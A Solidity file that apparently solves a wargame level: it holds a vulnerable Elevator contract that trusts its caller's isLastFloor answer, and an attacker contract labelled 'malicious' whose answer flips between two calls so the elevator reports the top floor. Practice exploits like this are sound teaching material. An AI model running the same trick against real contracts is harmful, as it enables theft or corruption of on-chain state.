// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// 
// interface Building {
//   function isLastFloor(uint) external returns (bool);
// }
contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

// Define the malicious Building contract
contract Building {
    Elevator ogContract = Elevator(/*your instance address*/);
    
    function attack(uint _floor) public {
        ogContract.goTo(_floor);
    }
    

    function isLastFloor(uint _floor) external view returns (bool) {
        if(ogContract.floor() != _floor) {
            return false;
        } else {
            return true;
        }
    }
}